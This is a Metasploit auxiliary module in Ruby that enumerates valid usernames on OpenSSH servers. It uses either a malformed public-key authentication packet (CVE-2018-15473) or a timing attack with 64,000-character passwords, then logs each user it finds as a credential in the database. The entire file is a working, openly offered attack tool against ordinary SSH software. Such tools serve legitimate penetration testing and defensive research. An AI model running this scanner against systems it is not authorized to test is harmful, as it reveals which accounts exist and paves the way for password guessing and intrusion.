##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SSH Username Enumeration',
      'Description'    => %q{
        This module uses a malformed packet or timing attack to enumerate users on
        an OpenSSH server.

        The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
        packet using public key authentication (must be enabled) to enumerate users.

        On some versions of OpenSSH under some configurations, OpenSSH will return a
        "permission denied" error for an invalid user faster than for a valid user,
        creating an opportunity for a timing attack to enumerate users.

        Testing note: invalid users were logged, while valid users were not. YMMV.
      },
      'Author'         => [
        'kenkeiras',     # Timing attack
        'Dariusz Tytko', # Malformed packet
        'Michal Sajdak', # Malformed packet
        'Qualys',        # Malformed packet
        'wvu'            # Malformed packet
      ],
      'References'     => [
        ['CVE', '2003-0190'],
        ['CVE', '2006-5229'],
        ['CVE', '2016-6210'],
        ['CVE', '2018-15473'],
        ['OSVDB', '32721'],
        ['BID', '20418'],
        ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
        ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
      ],
      'License'        => MSF_LICENSE,
      'Actions'        => [
        ['Malformed Packet',
         'Description' => 'Use a malformed packet',
         'Type'        => :malformed_packet
        ],
        ['Timing Attack',
         'Description' => 'Use a timing attack',
         'Type'        => :timing_attack
        ]
      ],
      'DefaultAction'  => 'Malformed Packet'
    ))

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(22),
        OptString.new('USERNAME',
                      [false, 'Single username to test (username spray)']),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line']),
        OptInt.new('THRESHOLD',
                   [true,
                   'Amount of seconds needed before a user is considered ' \
                   'found (timing attack only)', 10]),
        OptBool.new('CHECK_FALSE',
                    [false, 'Check for false positives (random username)', false])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('RETRY_NUM',
                   [true , 'The number of attempts to connect to a SSH server' \
                   ' for each user', 3]),
        OptInt.new('SSH_TIMEOUT',
                   [false, 'Specify the maximum time to negotiate a SSH session',
                   10]),
        OptBool.new('SSH_DEBUG',
                    [false, 'Enable SSH debugging output (Extreme verbosity!)',
                    false])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def threshold
    datastore['THRESHOLD']
  end

  # Returns true if a nonsense username appears active.
  def check_false_positive(ip)
    user = Rex::Text.rand_text_alphanumeric(8..32)
    attempt_user(user, ip) == :success
  end

  def check_user(ip, user, port)
    technique = action['Type']

    opts = {
      :port            => port,
      :use_agent       => false,
      :config          => false,
      :proxy           => ssh_socket_factory,
      :non_interactive => true,
      :verify_host_key => :never
    }

    # The auth method is converted into a class name for instantiation,
    # so malformed-packet here becomes MalformedPacket from the mixin
    case technique
    when :malformed_packet
      opts.merge!(:auth_methods => ['malformed-packet'])
    when :timing_attack
      opts.merge!(
        :auth_methods => ['password', 'keyboard-interactive'],
        :password     => rand_pass
      )
    end

    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opts)
      end
    rescue Rex::ConnectionError
      return :connection_error
    rescue Timeout::Error
      return :success if technique == :timing_attack
    rescue Net::SSH::AuthenticationFailed
      return :fail if technique == :malformed_packet
    rescue Net::SSH::Exception => e
      vprint_error("#{e.class}: #{e.message}")
    end

    finish_time = Time.new

    case technique
    when :malformed_packet
      return :success if ssh
    when :timing_attack
      return :success if (finish_time - start_time > threshold)
    end

    :fail
  end

  def rand_pass
    Rex::Text.rand_text_english(64_000..65_000)
  end

  def do_report(ip, user, port)
    service_data = {
      address: ip,
      port: rport,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Because this isn't using the AuthBrute mixin, we don't have the
  # usual peer method
  def peer(rhost=nil)
    "#{rhost}:#{rport} - SSH -"
  end

  def user_list
    users = []

    if datastore['USERNAME']
      users << datastore['USERNAME']
    elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
      users += File.read(datastore['USER_FILE']).split
    end

    users
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while attempt_num <= retry_num and (ret.nil? or ret == :connection_error)
      if attempt_num > 0
        Rex.sleep(2 ** attempt_num)
        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good("#{peer(ip)} User '#{user}' found")
      do_report(ip, user, rport)
    when :connection_error
      print_error("#{peer(ip)} User '#{user}' on could not connect")
    when :fail
      print_error("#{peer(ip)} User '#{user}' not found")
    end
  end

  def run_host(ip)
    print_status("#{peer(ip)} Using #{action.name.downcase} technique")

    if datastore['CHECK_FALSE']
      print_status("#{peer(ip)} Checking for false positives")
      if check_false_positive(ip)
        print_error("#{peer(ip)} throws false positive results. Aborting.")
        return
      end
    end

    users = user_list

    if users.empty?
      print_error('Please populate USERNAME or USER_FILE')
      return
    end

    print_status("#{peer(ip)} Starting scan")
    users.each { |user| show_result(attempt_user(user, ip), user, ip) }
  end
end
